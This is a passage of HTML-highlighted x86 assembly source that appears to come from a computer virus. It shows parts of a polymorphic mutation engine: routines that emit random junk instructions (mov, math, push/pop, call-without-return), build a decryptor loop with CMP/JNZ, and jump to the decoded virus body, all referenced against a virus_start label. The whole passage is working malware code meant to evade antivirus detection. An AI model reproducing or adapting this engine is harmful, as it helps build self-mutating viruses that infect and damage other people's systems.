        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_mov2reg</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_ge_bfinish</span><span class="sc0">

    </span><span class="sc5">__ppe_ge_mmx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; we must mov counter-mmx-reg &amp; c-copro-reg to b-reg32</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_reg_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0102h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_math_extended</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

    </span><span class="sc5">__ppe_ge_bfinish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_vfinish</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Bh</span><span class="sc0">          </span><span class="sc1">;CMP instruction</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc1">; restore used-regs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">850Fh</span><span class="sc0">        </span><span class="sc1">;JNZ..</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_back</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to jump to decode-virus-body ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">ppe_get_return</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save register</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; save used-regs</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gl_index_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc1">; remove flags from stack</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">

        </span><span class="sc1">; generate offset to jump back</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">file_size</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc1">; ready to JMP there</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">c_call_reg32</span><span class="sc0">        </span><span class="sc1">;edi-2 = call reg32 instr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_jump</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">10h</span><span class="sc0">    </span><span class="sc1">;CALL reg32 --&gt; JMP reg32</span><span class="sc0">

        </span><span class="sc1">; generate final garbages</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">__gr_final</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__gr_final</span><span class="sc0">

        </span><span class="sc1">; restore registers</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate one byte instruction that does not change regs ÃÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">gen_save_code</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">end_save_code</span><span class="sc4">-</span><span class="sc5">tbl_save_code</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_save_code</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate mov reg,imm ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_movreg32imm</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">   </span><span class="sc1">;mov empty_reg32,imm</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_movreg16imm</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">   </span><span class="sc1">;mov empty_reg16,imm</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0B866h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_movreg8imm</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">   </span><span class="sc1">;mov empty_reg8,imm</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_movreg8imm</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0004h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">a_movreg8imm</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate mov reg,reg ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_movregreg32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_reg</span><span class="sc0">     </span><span class="sc1">;mov empty_reg32,reg32</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">g_movregreg32</span><span class="sc0">       </span><span class="sc1">;mov ecx,ecx ? etc. ?</span><span class="sc0">
</span><span class="sc5">c_movregreg32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_movregreg16</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_reg</span><span class="sc0">     </span><span class="sc1">;mov empty_reg16,reg16</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">g_movregreg16</span><span class="sc0">       </span><span class="sc1">;mov si,si ? etc. ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">c_movregreg32</span><span class="sc0">

</span><span class="sc5">g_movregreg8</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_reg</span><span class="sc0">     </span><span class="sc1">;mov empty_reg8,reg8</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">g_movregreg8</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_movregreg8</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">g_movregreg8</span><span class="sc0">        </span><span class="sc1">;mov al,al ? etc. ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Ah</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2400h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">a_movregreg8</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate add/sub/xor/and/adc/sbb/or reg,imm ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_mathreg32imm</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">          </span><span class="sc1">;math reg32,imm</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__do_math_work</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_mathreg16imm</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8166h</span><span class="sc0">        </span><span class="sc1">;math reg16,imm</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__do_math_work</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_mathreg8imm</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">   </span><span class="sc1">;math reg8,imm</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_mathreg8imm</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__do_math_work</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc5">a_mathreg8imm</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__do_math_work</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">;select math operation</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">end_math_imm</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_math_imm</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_math_imm</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate push reg + garbage + pop reg ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_push_g_pop</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_reg</span><span class="sc0">     </span><span class="sc1">;   push rnd_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">          </span><span class="sc1">;   --garbage--</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;   --garbage--</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;   pop empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate call without return ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_call_cont</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">         </span><span class="sc1">;   call    __here</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;   --rnd data--</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;   --rnd data--</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">               </span><span class="sc1">;__here:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_gen_rnd_block</span><span class="sc0">   </span><span class="sc1">;   pop empty_reg</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
